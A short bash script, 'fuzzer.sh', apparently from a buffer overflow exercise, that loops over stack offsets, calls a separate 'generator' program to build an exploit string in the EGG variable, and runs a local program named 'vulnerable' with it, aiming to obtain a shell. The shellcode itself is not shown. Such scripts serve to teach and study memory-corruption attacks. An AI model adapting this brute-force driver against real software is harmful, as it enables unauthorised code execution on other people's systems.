#/bin/bash
#
# fuzzer.sh
# This is a tool that generates exploitation strings and tries to exploit the
# vulnarable program. Note, that fuzzer.sh must reside in the same directory
# where generator and vulnerable programs are located.
#

if [ "$EGG" = "" ]; then
    # generate
    buffersize=600 # default
    offset=0 # default
    if [ "$#" -gt 0 ]; then
        buffersize=$1; fi

    while [ true ]; do
        printf "buffersize: %s offset: %s on success exit shell with: %s\n" \
            $buffersize, $offset, "\"killall generator\""
        ./generator $buffersize $offset
        offset=$(($offset+4)) # consider 4-byte stack alignment
    done
else
    # exploit
    ./vulnerable $EGG
    exit
fi

